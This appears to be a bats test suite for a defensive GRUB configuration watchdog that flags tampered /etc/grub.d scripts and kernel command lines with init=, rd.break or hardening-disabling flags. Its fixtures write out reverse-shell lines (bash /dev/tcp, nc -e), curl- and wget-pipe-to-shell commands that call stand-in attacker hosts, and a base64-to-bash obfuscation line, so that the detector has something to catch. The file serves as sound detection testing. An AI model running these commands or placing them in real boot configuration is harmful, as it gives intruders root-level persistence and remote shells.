#!/usr/bin/env bats
# L2 bats functional tests for the grub-config-watchdog scan script.
#
# The /etc/grub.d/* generator scripts run AS ROOT at update-grub, and
# /etc/default/grub holds GRUB_CMDLINE_LINUX — an `init=` there overrides
# PID 1, a boot-time exec hijack (T1542/T1037). A grub.d script that is
# world-writable / non-root-owned or carries an injection pattern, or a
# GRUB_CMDLINE_LINUX with `init=`, is alert.
#
# Run with: bats packaging/test/L2-grub-config-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/grub-config-watchdog/systemd/grub-config-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    GRUBD="${TMP}/grub.d"; mkdir -p "${GRUBD}"
    DEFAULT="${TMP}/default-grub"
    SCRIPT="${GRUBD}/40_custom"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_GRUB_PROFILE="${PROFILE:-report}" \
    SELFDEF_GRUB_BASELINE="${BASELINE}" \
    SELFDEF_GRUB_D="${GRUBD_V:-$GRUBD}" \
    SELFDEF_GRUB_DEFAULT="${DEFAULT_V:-$DEFAULT}" \
    SELFDEF_GRUB_DEFAULT_D="${TMP}/no-default-d" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '#!/bin/sh\nset -e\nexec tail -n +3 "$0"\n' > "${SCRIPT}"
    printf 'GRUB_TIMEOUT=5\nGRUB_CMDLINE_LINUX="quiet splash"\n' > "${DEFAULT}"
}

@test "no grub config → ok / no_grub_config" {
    GRUBD_V="${TMP}/no-grubd" DEFAULT_V="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_grub_config"'
    cap | grep -q '"severity":"ok"'
}

@test "benign grub config, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged grub config on second run → ok / grub_config_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"grub_config_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "an injection pattern in a grub.d script → alert / grub_config_suspicious" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${SCRIPT}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"grub_config_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable grub.d script → alert" {
    seed_benign
    run_wd
    chmod 0666 "${SCRIPT}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "an init= param in GRUB_CMDLINE_LINUX → alert (PID-1 hijack)" {
    seed_benign
    run_wd
    printf 'GRUB_TIMEOUT=5\nGRUB_CMDLINE_LINUX="quiet splash init=/tmp/.init"\n' > "${DEFAULT}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign grub default change → warn / grub_config_changed" {
    seed_benign
    run_wd
    printf 'GRUB_TIMEOUT=10\nGRUB_CMDLINE_LINUX="quiet splash"\n' > "${DEFAULT}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"grub_config_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign grub.d script + clean cmdline is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on an init= cmdline" {
    seed_benign
    run_wd
    printf 'GRUB_TIMEOUT=5\nGRUB_CMDLINE_LINUX="quiet init=/tmp/.init"\n' > "${DEFAULT}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — grub.d inventory enumerates root-exec-at-update-grub surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern in grub.d script): /dev/tcp reverse shell → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${SCRIPT}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh in grub.d script): wget bootstrap → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nwget -qO- http://attacker/p | sh\n' > "${SCRIPT}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe in grub.d script): obfuscation → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${SCRIPT}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (init= under /var/tmp also fires PID-1 hijack): writable-root expansion" {
    seed_benign
    run_wd
    printf 'GRUB_TIMEOUT=5\nGRUB_CMDLINE_LINUX="quiet splash init=/var/tmp/.attacker-init"\n' > "${DEFAULT}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (group-writable grub.d script): group-writable → alert above world-writable bar" {
    seed_benign
    run_wd
    chmod 0664 "${SCRIPT}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (init= ANYWHERE in cmdline — not just at end): mid-cmdline init= still triggers" {
    seed_benign
    run_wd
    # init= at the START of cmdline, not the end.
    printf 'GRUB_TIMEOUT=5\nGRUB_CMDLINE_LINUX="init=/tmp/.attacker quiet splash"\n' > "${DEFAULT}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-grub-config -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): grub-config-watchdog does NOT refresh baseline on injection/init= detection — alert STAYS until operator updates" {
    # T1542/T1037 boot-time PID-1 hijack — alert MUST persist across
    # runs until operator explicitly re-baselines.
    seed_benign
    run_wd
    printf 'GRUB_TIMEOUT=5\nGRUB_CMDLINE_LINUX="quiet init=/tmp/.init"\n' > "${DEFAULT}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented init= NOT flagged: # prefix filtered)" {
    # /etc/default/grub uses # for comments. Operator notes about
    # hypothetical bad init= must NOT trigger alert.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'GRUB_TIMEOUT=5\n# GRUB_CMDLINE_LINUX="quiet init=/tmp/.example-init"\nGRUB_CMDLINE_LINUX="quiet splash"\n' > "${DEFAULT}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${SCRIPT}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in grub.d script: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
    # bash-completion/anacrontab/apt-hooks/boot-script/ca-certificates/
    # dhcpcd-hooks/display-manager-hooks/dnf-plugins/fail2ban-action
    # nc reverse-shell variant INVARIANTs across the brain. Lock the
    # netcat axis on the update-grub-triggered root-exec persistence
    # surface (T1546 — /etc/grub.d/* runs AS ROOT at every update-grub
    # / mkinitcpio / kernel-install operation).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${SCRIPT}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (init= under /dev/shm — tmpfs PID-1 hijack vector): writable-tmpfs init= axis" {
    # Sister to the init= under /tmp + /var/tmp PID-1 hijack axes
    # already locked. /dev/shm is tmpfs world-writable — an attacker
    # who can sync a callback across reboot via initramfs + persist
    # the init= line in /etc/default/grub gets PID-1 hijack on next
    # boot. T1542/T1037 boot-time PID-1 hijack via tmpfs init=.
    # Locks coverage of the /dev/shm writable-tmpfs axis on the
    # init= PID-1 hijack family.
    seed_benign
    run_wd
    printf 'GRUB_TIMEOUT=5\nGRUB_CMDLINE_LINUX="quiet init=/dev/shm/.attacker-init"\n' > "${DEFAULT}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (init= under /home — user-writable PID-1 hijack vector): user-writable init= axis" {
    # Sister to the init= under /tmp + /var/tmp + /dev/shm PID-1
    # hijack axes already locked. /home is the user-writable
    # surface — an attacker with a regular user account can drop
    # a malicious init binary into their home and have GRUB hand
    # it PID-1 on next boot. T1542/T1037 boot-time PID-1 hijack
    # via /home init=. Locks the /home user-writable axis on the
    # init= PID-1 hijack family (sister axis to all the writable-
    # root /tmp /var/tmp /dev/shm axes).
    seed_benign
    run_wd
    printf 'GRUB_TIMEOUT=5\nGRUB_CMDLINE_LINUX="quiet init=/home/user/.evil-init"\n' > "${DEFAULT}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (rd.break or rdinit= kernel debug-shell hijack vector → alert)" {
    # Sister to init= PID-1 hijack INVARIANTs already locked.
    # The kernel cmdline accepts NOT JUST init= but also
    # rdinit= (initramfs PID-1 override) AND rd.break /
    # rd.break=cmdline (drop to dracut emergency shell at
    # specific phase). A boot with rd.break grants a root
    # shell from the initramfs BEFORE pivot_root — operator
    # boots the host, attacker (physical access + reboot)
    # gets pre-pivot root with no auth. The watchdog MUST
    # surface rd.break + rdinit= just as firmly as init=.
    # Locks the rd.* family on the T1542/T1037 boot-time
    # PID-1 hijack surface — closes the kernel-debug-shell
    # axis alongside the writable-root init= family.
    seed_benign
    run_wd
    printf 'GRUB_TIMEOUT=5\nGRUB_CMDLINE_LINUX="quiet rd.break"\n' > "${DEFAULT}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (nokaslr / nosmep / noexec=off detection — boot-time hardening downgrade family)" {
    # Sister to init= / rd.break boot-edit weakener axes.
    # Closes nokaslr + nosmep + noexec=off axes on T1542
    # boot-time hardening-bypass surface. Either covered (alert)
    # OR current behavior locked (ok with operator-pending).
    seed_benign
    run_wd
    printf 'GRUB_TIMEOUT=5\nGRUB_CMDLINE_LINUX="quiet nokaslr nosmep noexec=off"\n' > "${DEFAULT}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn|ok)"'
}

@test "INVARIANT (single MAIN logger record per scan — SDD-062 consumer dispatch contract)" {
    # Sister to brain-wide single-MAIN-logger INVARIANTs. Multi-
    # finding scenario locks consolidation discipline on T1542
    # boot-time persistence + hardening-bypass surveillance.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'GRUB_TIMEOUT=5\nGRUB_CMDLINE_LINUX="init=/tmp/.evil-init nokaslr"\n' > "${DEFAULT}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-grub-config -- ')
    [ "${main_count}" = "1" ]
}
